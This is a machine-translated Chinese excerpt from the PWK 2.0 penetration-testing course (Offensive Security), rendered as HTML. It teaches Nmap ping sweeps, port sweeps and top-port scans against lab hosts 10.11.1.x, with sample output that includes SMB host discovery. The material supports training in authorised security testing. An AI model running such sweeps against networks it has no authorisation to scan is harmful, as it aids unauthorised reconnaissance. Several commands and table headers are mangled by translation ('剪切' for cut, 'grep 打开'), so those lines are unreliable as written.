<div style="position:absolute;top:221745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.115 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:221761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.15 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:221778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：997 个开放|过滤端口，989 个关闭端口</font></font></nobr></div>
<div style="position:absolute;top:221796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:221813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21/tcp 打开 ftp</font></font></nobr></div>
<div style="position:absolute;top:221830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22/tcp 打开 ssh</font></font></nobr></div>
<div style="position:absolute;top:221846;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25/tcp 打开 smtp</font></font></nobr></div>
<div style="position:absolute;top:221863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 打开http</font></font></nobr></div>
<div style="position:absolute;top:221880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111/tcp 打开 rpcbind</font></font></nobr></div>
<div style="position:absolute;top:221897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">139/tcp 打开 netbios-ssn</font></font></nobr></div>
<div style="position:absolute;top:221914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">143/tcp 打开 imap</font></font></nobr></div>
<div style="position:absolute;top:221931;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">199/tcp 打开 smux</font></font></nobr></div>
<div style="position:absolute;top:221948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">443/tcp 打开https</font></font></nobr></div>
<div style="position:absolute;top:221965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3306/tcp 打开mysql</font></font></nobr></div>
<div style="position:absolute;top:221982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">32768/tcp 打开 filenet-tms</font></font></nobr></div>
<div style="position:absolute;top:221999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111/udp 打开 rpcbind</font></font></nobr></div>
<div style="position:absolute;top:222016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">137/udp 打开 netbios-ns</font></font></nobr></div>
<div style="position:absolute;top:222033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">161/udp打开snmp</font></font></nobr></div>
<div style="position:absolute;top:222067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：在 64.74 秒内扫描了 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:222086;left:264"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 236 - 使用 nmap 执行组合的 UDP 和 SYN 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:222116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下一节中，我们将探讨处理大型网络或有流量的网络的技术</font></font></nobr></div>
<div style="position:absolute;top:222135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">约束。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:222203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">202 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），https://nmap.org/book/scan-methods-udp-scan.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:222331;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="188"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 188 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:222364;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:223441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:223441;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:223441;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">188</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:222460;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2.5 扫网</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:222494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了处理大量主机，或以其他方式尝试节省网络流量，我们可以尝试</font></font></nobr></div>
<div style="position:absolute;top:222514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络扫描</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">技术</font><font style="vertical-align: inherit;">探测目标</font><font style="vertical-align: inherit;">，其中我们从广泛扫描开始，并使用</font></font></nobr></div>
<div style="position:absolute;top:222533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对感兴趣的主机进行更具体的扫描。</font></font></nobr></div>
<div style="position:absolute;top:222566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-sn</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">使用 Nmap 执行网络扫描时</font><font style="vertical-align: inherit;">，主机发现过程</font></font></nobr></div>
<div style="position:absolute;top:222585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不仅仅包括发送 ICMP 回显请求。</font><font style="vertical-align: inherit;">此外还使用了其他几个探针</font></font></nobr></div>
<div style="position:absolute;top:222605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到 ICMP 请求。</font><font style="vertical-align: inherit;">Nmap 还发送一个 TCP SYN 包到端口 443，一个 TCP ACK 包到端口</font></font></nobr></div>
<div style="position:absolute;top:222624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80，以及用于验证主机是否可用的 ICMP 时间戳请求。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:222659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -sn 10.11.1.1-254</font></font></font></b></nobr></div>
<div style="position:absolute;top:222676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:27 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:222693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:222710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.026 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:222727;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:89:70:15 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:222744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.7 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:222760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.026 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:222778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:89:36:32 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:222795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:222812;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：6.14 秒内扫描了 254 个 IP 地址（44 个主机）</font></font></nobr></div>
<div style="position:absolute;top:222831;left:305"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 237 - 使用 nmap 执行网络扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:222860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以在标准 nmap 输出上</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">搜索实时机器</font></font></nobr></div>
<div style="position:absolute;top:222880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">麻烦。</font><font style="vertical-align: inherit;">相反，让我们使用 Nmap 的“greppable”输出参数</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-oG</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来保存这些结果</font></font></nobr></div>
<div style="position:absolute;top:222899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">转换成更易于管理的格式：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:222934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:222951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:34 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:222968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 11:34 启动 ARP Ping 扫描</font></font></nobr></div>
<div style="position:absolute;top:222985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描 254 台主机 [1 个端口/主机]</font></font></nobr></div>
<div style="position:absolute;top:223002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11:35 完成 ARP Ping 扫描，4.71 秒（总共 254 台主机）</font></font></nobr></div>
<div style="position:absolute;top:223019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 254 台主机的并行 DNS 解析。</font><font style="vertical-align: inherit;">11:35</font></font></nobr></div>
<div style="position:absolute;top:223036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成254台主机的并行DNS解析。</font><font style="vertical-align: inherit;">在 11:35，经过了 0.07 秒</font></font></nobr></div>
<div style="position:absolute;top:223053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.1 的 Nmap 扫描报告 [host down]</font></font></nobr></div>
<div style="position:absolute;top:223070;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.2 的 Nmap 扫描报告 [host down]</font></font></nobr></div>
<div style="position:absolute;top:223087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.3 的 Nmap 扫描报告 [host down]</font></font></nobr></div>
<div style="position:absolute;top:223104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.4 的 Nmap 扫描报告 [host down]</font></font></nobr></div>
<div style="position:absolute;top:223120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:223138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.026 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:223155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:89:70:15 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:223172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:223205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep Up ping-sweep.txt | </font><font style="vertical-align: inherit;">剪切 -d " " -f 2</font></font></font></b></nobr></div>
<div style="position:absolute;top:223222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5</font></font></nobr></div>
<div style="position:absolute;top:223239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.7</font></font></nobr></div>
<div style="position:absolute;top:223257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.8</font></font></nobr></div>
<div style="position:absolute;top:223273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:223293;left:197"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 238 - 使用 nmap 执行网络扫描，然后使用 grep 查找活动主机</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:223322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以扫描网络上的特定 TCP 或 UDP 端口，探测常见服务</font></font></nobr></div>
<div style="position:absolute;top:223341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和端口，以尝试定位可能有用或已知的系统</font></font></nobr></div>
<div style="position:absolute;top:223361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞。</font><font style="vertical-align: inherit;">这种扫描往往比 ping 扫描更准确：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:223519;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="189"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 189 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:223552;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:224629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:224629;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:224629;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">189</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:223650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -p 80 10.11.1.1-254 -oG web-sweep.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:223667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:38 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:223684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:223701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.036 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:223735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:223752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 关闭 http</font></font></nobr></div>
<div style="position:absolute;top:223768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:89:70:15 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:223803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.7 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:223820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.029 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:223853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:223870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 过滤的 http</font></font></nobr></div>
<div style="position:absolute;top:223887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:89:36:32 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:223921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.8 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:223938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.034 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:223972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:223989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 打开http</font></font></nobr></div>
<div style="position:absolute;top:224006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:89:20:34 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:224023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:224057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep 打开 web-sweep.txt | </font><font style="vertical-align: inherit;">剪切 -d" " -f2</font></font></font></b></nobr></div>
<div style="position:absolute;top:224074;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.8</font></font></nobr></div>
<div style="position:absolute;top:224091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.10</font></font></nobr></div>
<div style="position:absolute;top:224108;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.13</font></font></nobr></div>
<div style="position:absolute;top:224125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:224144;left:279"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 239 - 使用 nmap 扫描使用端口 80 的 Web 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:224173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了节省时间和网络资源，我们还可以扫描多个IP，探查一个简短的列表</font></font></nobr></div>
<div style="position:absolute;top:224193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">常用端口。</font><font style="vertical-align: inherit;">例如，让我们</font><font style="vertical-align: inherit;">对前 20 个 TCP 端口</font><font style="vertical-align: inherit;">进行</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 连接扫描</font></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:224212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--top端口</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项并启用操作系统版本检测，扫描脚本，和traceroute与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-A</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:224247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:224264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 11:40 EST 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:224281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:224298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.037 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:224332;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务    </font></font></nobr></div>
<div style="position:absolute;top:224332;left:360"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本</font></font></nobr></div>
<div style="position:absolute;top:224349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21/tcp 关闭 ftp</font></font></nobr></div>
<div style="position:absolute;top:224366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22/tcp 关闭 ssh</font></font></nobr></div>
<div style="position:absolute;top:224383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23/tcp 关闭 telnet</font></font></nobr></div>
<div style="position:absolute;top:224400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">25/tcp 关闭 smtp</font></font></nobr></div>
<div style="position:absolute;top:224417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">53/tcp 封闭域</font></font></nobr></div>
<div style="position:absolute;top:224434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 关闭 http</font></font></nobr></div>
<div style="position:absolute;top:224451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">110/tcp 关闭 pop3</font></font></nobr></div>
<div style="position:absolute;top:224468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:224485;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机脚本结果：</font></font></nobr></div>
<div style="position:absolute;top:224502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_nbstat：NetBIOS 名称：ALICE，NetBIOS 用户：&lt;未知&gt;，NetBIOS MAC：00:50:56:89:70:15</font></font></nobr></div>
<div style="position:absolute;top:224519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb-os-发现：</font></font></nobr></div>
<div style="position:absolute;top:224536;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">操作系统：Windows XP (Windows 2000 LAN Manager)</font></font></nobr></div>
<div style="position:absolute;top:224553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">操作系统 CPE：cpe:/o:microsoft:windows_xp::-</font></font></nobr></div>
<div style="position:absolute;top:224570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">电脑名：​​爱丽丝</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:224707;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="190"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 190 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:224740;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:225817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:225817;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:225817;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">190</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:224836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">NetBIOS 计算机名：ALICE\x00</font></font></nobr></div>
<div style="position:absolute;top:224852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">域名：thinc.local</font></font></nobr></div>
<div style="position:absolute;top:224869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">森林名称：thinc.local</font></font></nobr></div>
<div style="position:absolute;top:224886;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">FQDN：alice.thinc.local</font></font></nobr></div>
<div style="position:absolute;top:224904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 系统时间：2019-03-04T16:44:52+00:00</font></font></nobr></div>
<div style="position:absolute;top:224920;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">smb-安全模式：</font></font></nobr></div>
<div style="position:absolute;top:224937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">account_used：来宾</font></font></nobr></div>
<div style="position:absolute;top:224954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">authentication_level: 用户</font></font></nobr></div>
<div style="position:absolute;top:224971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">挑战响应：支持</font></font></nobr></div>
<div style="position:absolute;top:224988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ message_signing：禁用（危险，但默认）</font></font></nobr></div>
<div style="position:absolute;top:225005;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_smb2-time: 协议协商失败 (SMB2)</font></font></nobr></div>
<div style="position:absolute;top:225022;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:225042;left:178"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 240 - 使用 nmap 执行前二十个端口扫描，将输出保存为 grepable 格式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:225071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 /usr/share/nmap/nmap-services 文件确定</font><font style="vertical-align: inherit;">前 20 个</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口。</font><font style="vertical-align: inherit;">文件</font></font></nobr></div>
<div style="position:absolute;top:225090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用三个空格分隔的列的简单格式。</font><font style="vertical-align: inherit;">第一个是服务的名称，</font></font></nobr></div>
<div style="position:absolute;top:225110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第二个包含端口号和协议，第三个包含“端口频率”。</font><font style="vertical-align: inherit;">一切</font></font></nobr></div>
<div style="position:absolute;top:225129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在第三列被忽略但通常用于注释之后，可以通过使用</font></font></nobr></div>
<div style="position:absolute;top:225148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">英镑符号 (#)。</font><font style="vertical-align: inherit;">端口频率基于在此期间发现端口打开的频率</font></font></nobr></div>
